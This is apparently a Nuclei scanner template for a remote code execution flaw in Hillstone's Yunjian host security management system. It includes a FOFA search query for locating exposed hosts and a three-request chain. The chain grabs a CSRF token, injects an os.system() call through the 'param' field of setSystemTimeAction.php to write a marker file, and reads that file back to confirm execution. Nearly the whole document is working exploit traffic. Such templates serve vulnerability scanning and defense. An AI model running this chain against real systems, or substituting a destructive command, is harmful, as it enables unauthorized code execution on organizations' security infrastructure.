id: shanshi-shenji-setsystemtimeaction-rce
info:
  name: shanshi-shenji-setsystemtimeaction-rce
  author: unknow
  severity: critical
  description: 山石网科云鉴安全管理系统 setsystemtimeaction 存在rce漏洞。
  tags: shanshi,rce
  metadata:
    fofa-query: body=山石云鉴主机安全管理系统
http:
  - raw:
      - |
        GET /master/ajaxActions/getTokenAction.php HTTP/1.1
        Host: 
        Cookie: PHPSESSID=2333333333333;
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0

      - |
        POST /master/ajaxActions/setSystemTimeAction.php?token_csrf={{token}} HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Cookie: PHPSESSID=2333333333333;
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 84

        param=os.system('echo 23333333333456 > /opt/var/majorsec/installation/master/runtime/img/config')

      - |
        GET /master/img/config HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 

    extractors:
      - type: regex
        part: body
        name: token
        internal: true
        regex:
          - '[a-z0-9]{32}'

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_3==200 && contains(body_3, "23333333333456") && contains(header_3, "application/octet-stream")'